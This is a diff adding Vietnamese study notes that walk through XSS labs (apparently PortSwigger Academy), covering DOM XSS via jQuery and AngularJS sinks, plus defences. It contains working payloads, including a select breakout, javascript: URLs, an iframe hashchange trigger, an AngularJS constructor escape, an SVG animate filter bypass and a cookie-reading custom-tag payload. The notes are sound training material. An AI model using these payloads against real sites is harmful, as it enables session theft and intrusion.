@@ -262,6 +262,207 @@ DOM-based XSS thường xảy ra khi JavaScript lấy dữ liệu do attacker ki
 
 Lưu ý: Nội dung đưa vào document.write có thể nằm trong context HTML có sẵn, nên cần xem xét nội dung xung quanh. Ví dụ: có thể phải đóng thẻ HTML đang mở trước rồi mới chèn payload JavaScript.
 
+Lab 8:  
+
 Yêu cầu bài lab:
 
 ![alt text](image-27.png)
+
+Đoạn JS xử lý: 
+
+![alt text](image-28.png)
+
+Payload: `</option></select><script>alert(1)</script><select><option selected>`
+
+Hoàn thành bài lab:
+
+![alt text](image-29.png)
+
+### Sources và sinks trong thư viện bên thứ ba
+#### DOM XSS trong jQuery
+
+Nếu ứng dụng sử dụng jQuery, hãy chú ý đến các sink có thể thay đổi phần tử DOM. Ví dụ, hàm attr() của jQuery có thể thay đổi thuộc tính của phần tử DOM.
+
+Nếu dữ liệu từ nguồn do người dùng kiểm soát như URL được truyền vào attr(), attacker có thể thao túng giá trị để gây XSS.
+
+Ví dụ:
+```
+$(function() {
+    $('#backLink').attr("href",
+        (new URLSearchParams(window.location.search)).get('returnUrl')
+    );
+});
+```
+
+Ở đây, location.search là source, còn attr() là sink.
+
+Có thể khai thác bằng cách đưa một JavaScript URL độc hại vào tham số returnUrl: `?returnUrl=javascript:alert(document.domain)`
+
+Khi JavaScript gán giá trị này vào thuộc tính href của liên kết Back, việc click vào liên kết sẽ thực thi JavaScript và gây DOM XSS.
+
+Một sink khác trong jQuery: $(). Hàm này có thể được sử dụng để đưa các đối tượng độc hại vào DOM. Trước đây, jQuery rất phổ biến và từng xuất hiện một dạng DOM XSS kinh điển khi website sử dụng $() kết hợp với location.hash để tạo hiệu ứng animation hoặc tự động cuộn đến một phần tử trên trang.
+
+Ví dụ:
+```
+$(window).on('hashchange', function() {
+    var element = $(location.hash);
+    element[0].scrollIntoView();
+});
+```
+
+Ở đây:
+- location.hash → source, vì người dùng có thể kiểm soát.
+- $() → sink, có thể dẫn đến việc chèn HTML độc hại.
+- hashchange → sự kiện được kích hoạt khi giá trị #fragment trong URL thay đổi.
+
+Attacker có thể lợi dụng location.hash để đưa payload XSS vào $(). Các phiên bản jQuery mới đã vá lỗi này bằng cách ngăn không cho chèn HTML vào selector khi input bắt đầu bằng ký tự #. Tuy nhiên, vẫn có thể gặp những đoạn code dễ bị lỗi trong các ứng dụng cũ.
+
+Kích hoạt hashchange mà không cần người dùng thao tác: Để khai thác, cần tìm cách khiến sự kiện hashchange xảy ra tự động. Một cách đơn giản là sử dụng iframe:
+
+```
+<iframe src="https://vulnerable-website.com#" 
+        onload="this.src+='<img src=1 onerror=alert(1)>'">
+</iframe>
+```
+
+Cách hoạt động:
+1. iframe tải trang đích với hash rỗng (#).
+2. Khi iframe load xong, onload được thực thi.
+3. Payload được nối thêm vào this.src, làm thay đổi hash.
+4. Sự thay đổi này kích hoạt sự kiện hashchange.
+5. Code dễ bị lỗi lấy location.hash và truyền vào $().
+6. Payload được xử lý và dẫn đến DOM XSS.
+
+#### DOM XSS trong AngularJS
+
+ng-app → AngularJS xử lý {{...}} → có thể dẫn đến XSS nếu dữ liệu bên trong do người dùng kiểm soát.
+
+Lab 9: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
+
+![alt text](image-30.png)
+
+Yêu cầu bài lab
+
+Payload: `{{constructor.constructor('alert(1)')()}}`
+
+Vì: Object -(.constructor)-> constructor -(.constructor)-> Function
+
+Do đó: constructor.constructor('alert(1)')  ~ Function('alert(1)') sau đó gọi hàm thực thi ()
+
+Hoàn thành bài lab
+
+![alt text](image-31.png)
+
+Lab 10: Reflected XSS with event handlers and href attributes blocked
+
+Yêu cầu bài lab
+
+![alt text](image-32.png)
+
+Ta thử các thẻ thì nhận thấy các thẻ `<a>, <svg>, <text>` là không bị chặn. Lợi dụng `animate` để thay đổi thuộc tính phần tử. Nếu href="javascript:alert(1)" thì sẽ bị filter block, nên thuộc tính animate thay đổi thuộc tính href.
+
+Payload: `<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>`
+
+Sau đó bài lab được hoàn thành:
+
+![alt text](image-33.png)
+
+Lab 11: Reflected XSS into HTML context with all tags blocked except custom ones
+
+Yêu cầu bài lab:
+
+![alt text](image-34.png)
+
+Vì bài lab chỉ cho phép inject custom tag ta nghĩ đến thẻ <xss>. Đến Exploit Server, xác định phần bị xss là body
+
+![alt text](image-35.png)
+
+Payload: `<script>location ='https://0aba00ec042cf1c1801c172800ec0095.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x'</script>`
+
+Hoàn thành bài lab:
+![alt text](image-36.png)
+
+Giải thích payload: <script>location='...' </script> dùng để chuyển victim từ Exploit Server sang URL của lab. Trong URL, ?search= chứa custom tag <xss id=x onfocus=alert(document.cookie) tabindex=1>. id=x tạo phần tử có ID x, onfocus sẽ chạy alert(document.cookie) khi phần tử được focus, còn tabindex=1 cho phép nó nhận focus. Cuối URL có #x, khiến trình duyệt tìm và focus vào phần tử id=x, từ đó kích hoạt onfocus và chạy alert(document.cookie)
+
+Lab 12: DOM XSS in jQuery anchor href attribute sink using location.search source
+
+Yêu cầu bài lab:
+
+![alt text](image-37.png)
+
+Đoạn JS xử lý dữ liệu:
+
+![alt text](image-38.png)
+
+Vì mong muốn thực hiện chèn payload vào phần href, tức nhận input từ returnPath -> cần chèn vào vị trí của request returnPath
+
+![alt text](image-39.png)
+![alt text](image-40.png)
+
+Lab 13: DOM XSS in document.write sink using source location.search
+
+Yêu cầu bài lab:
+
+![alt text](image-41.png)
+
+Đoạn JS xử lý
+
+![alt text](image-42.png)
+
+Thực hiện chèn payload để phá chuỗi vì chuỗi input được truyền thẳng vào query: `"><svg onload=alert(1)>`
+
+![alt text](image-43.png)
+![alt text](image-44.png)
+
+Lab 14: Stored XSS into HTML context with nothing encoded
+
+Yêu cầu bài lab:
+
+![alt text](image-45.png)
+
+Payload được chèn vào `<script>alert(1)</script>`
+
+![alt text](image-46.png)
+![alt text](image-47.png)
+
+Lab 15: Reflected XSS into HTML context with nothing encoded
+
+Yêu cầu bài lab
+
+![alt text](image-48.png)
+
+Payload chèn vaò ô search: `<script>alert(1)</script>`
+
+Hoàn thành bài lab:
+![alt text](image-49.png)
+
+## Cách phòng tránh XSS
+
+Nguyên tắc quan trọng nhất là: không đưa dữ liệu do người dùng kiểm soát trực tiếp vào HTML/JavaScript mà chưa xử lý đúng theo context.
+1. Output Encoding: 
+
+Khi hiển thị dữ liệu người dùng, encode ký tự đặc biệt. VD user nhập `<script>alert(1)</script>` thì HTML render thành `&lt;script&gt;alert(1)&lt;/script&gt;`
+
+2. Tránh các DOM XSS sink nguy hiểm
+
+Hạn chế: document.write(userInput);, element.innerHTML = userInput;, eval(userInput);
+
+Thay bằng các API an toàn ví dụ: element.textContent = userInput;
+
+3. Nếu bắt buộc cho phép HTML → sanitize
+
+Nếu ứng dụng thực sự cần cho user nhập HTML, chẳng hạn trình soạn thảo bài viết, không nên chỉ encode toàn bộ. Cần dùng HTML sanitizer đáng tin cậy, Sanitizer sẽ loại bỏ những thành phần nguy hiểm
+
+4. Không nối chuỗi để tạo HTML
+
+Không nên: `element.innerHTML = "<div>" + username + "</div>";`
+
+Nên: 
+```
+const div = document.createElement("div");
+div.textContent = username;
+element.appendChild(div);
+```
+
+5. Cookie nên có HttpOnly
+
